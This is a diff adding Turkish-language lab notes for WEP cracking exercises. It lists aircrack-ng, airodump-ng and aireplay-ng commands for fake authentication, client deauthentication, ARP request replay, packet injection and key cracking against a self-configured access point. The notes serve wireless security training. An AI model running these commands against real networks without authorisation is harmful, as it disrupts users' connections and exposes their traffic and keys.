@@ -1,0 +1,113 @@
+### 7. Cracking WEP with Connected Clients ###
+
+7.2.4 Fake Authentication Lab
+
+AP'nizin WEP şifreleme ve açık kimlik doğrulama ile yapılandırıldığından emin olun.
+
+- Kartınızı izleme modunda AP'nizle aynı kanala yerleştirin
+- AP trafiğini yakalamaya başlayın ve yakalamayı bir dosyaya kaydedin
+- AP'ye sahte kimlik doğrulaması yapmak için Aireplay-ng'yi kullanın
+- Devam etmeden önce sahte kimlik doğrulamanın başarılı olduğunu doğrulayın
+
+# airmon-ng start <interface name> <channel> 
+# airodump-ng -c <channel> --bssid <AP MAC> -w <filename> <interface name> 
+# aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface name> 
+# airodump-ng -c <channel> --bssid <AP MAC> <interface name> 
+
+-------
+
+7.3.3 Deauthentication Lab 
+
+- Kurban istemcinizde, erişim noktasına süresiz olarak ping atın (Windows'ta -t anahtarını kullanın). Aireplay-ng'yi şu amaçlarla kullanın:
+- İstemcinin kimlik doğrulamasını kaldır.
+- Saldırıyı başlattıktan sonra, hızlı bir şekilde kurban müşterinize geri dönün ve kimlik doğrulaması kaldırılırken neler olduğunu gözlemleyin.
+
+# ping -t AP_IP (CLIENT IP adresinden AP'ye ping at.)
+# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name> 
+
+--------
+
+7.4.4 ARP Request Replay Attack Lab 
+
+AP'nizin açık kimlik doğrulama ile WEP şifrelemesi için yapılandırıldığından emin olun ve ona bağlanmak için bir kablosuz istemci kurun. Kablosuz kartınızı erişim 
+noktasının kanal numarası üzerinde izleme moduna getirmeyi ve dosyayı diske kaydederek bir Airodump yakalama işlemi başlatmayı unutmayın.
+
+Aireplay-ng'yi şu amaçlarla kullanın:
+
+- Erişim noktasına sahte kimlik doğrulama yapın
+- ARP isteği yeniden oynatma saldırısını başlatın
+- Bağlı istemciye karşı bir kimlik doğrulama saldırısı çalıştırın
+
+# airmon-ng start wlan0 3
+# airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w wep1 mon0
+# aireplay-ng -1 0 -e wifu -a 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0
+# aireplay-ng -3 -b 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0 
+# aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0 
+
+
+---------
+
+
+7.5.5 Aircrack-ng Lab 
+
+Bu modülü tam olarak takip etmediyseniz, AP'nizin WEP şifrelemesi ve bağlı bir istemciyle açık kimlik doğrulama ile yapılandırıldığından emin olun.
+
+- Kartınızı AP kanalında izleme moduna yerleştirin ve bir Airodump çekimi başlatın.
+- Erişim noktasına karşı sahte bir kimlik doğrulaması çalıştırın ve ARP isteği tekrar saldırısı olan saldırıyı 3 başlatın.
+- İstemcinin kimlik doğrulamasını kaldırmaya zorlamak, yeniden bağlanmak ve bir ARP paketi göndermektir.
+- Aircrack-ng kullanarak çalışan yakalamayı kırın.
+- Laboratuvarınızda, kırma hızlarındaki farkı ve bunları kırmak için gereken IV sayısını görmek için farklı WEP anahtar uzunluklarını ve çeşitli karmaşıklıkları 
+  deneyin.
+
+# airmon-ng start <interface name> <channel> 
+# airodump-ng -c <channel> --bssid <AP MAC> -w <filename> <interface name> 
+# aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface name> 
+# aireplay-ng -3 -b 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0 
+# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name> 
+# aircrack-ng <capture filename> 
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+### 8. Cracking WEP via a Client ###
+
+8.1.1 Attack Setup Lab 
+
+Erişim noktanızı açık kimlik doğrulama ile WEP şifrelemesini kullanacak şekilde yapılandırın ve kurban istemcinizin erişim noktasıyla ilişkilendirildiğinden emin 
+olun.
+
+	• Kablosuz kartınızı AP kanalındaki izleme moduna yerleştirin ve bir Airodump çekimi başlatın.
+	• AP'ye karşı sahte bir kimlik doğrulama saldırısı gerçekleştirin. Sahte kimlik doğrulama saldırısını, zaman aşımına uğramaması için yeniden ilişkilendirme 
+    aralığı ile yürütmekten çekinmeyin.
+ 
+
+	1. airmon-ng start <interface> <AP Channel>
+	2. airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface> 
+	3. aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface> 
+
+---
+
+8.2.4 Interactive Packet Replay Lab 
+
+AP'nizin, bağlı bir kurban istemciyle WEP şifrelemesi için yapılandırıldığından emin olun. Kablosuz kartınızı monitör moduna yerleştirin ve henüz yapmadıysanız bir
+Airodump çekimi başlatın. Aireplay-ng'yi şu amaçlarla kullanın:
+
+• "Natural Packet Replay " özelliğini kullanarak ağa trafik enjekte edin
+• "Modified Packet Replay " özelliğini kullanarak ağa trafik enjekte edin
+• "Natural Packet Replay " saldırısı için iyi bir paket yakalama sürecini acele etmeye çalışın
+
+	1. airmon-ng start <interface> <AP Channel>
+	2. airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface> 
+	3. aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface> 
+	4. aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <interface> 
+	5. aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface> 
+
+---
+
+8.3.1 Lab 
+
+Aircrack-ng'yi çalışan yakalamanıza karşı çalıştırın ve AP'lerinizin WEP anahtarını kırın. Çatlama hızlarındaki farkı görmek için farklı Aircrack seçenekleriyle 
+denemeler yapın.
+
+aircrack-ng -z -n 64 <capture>
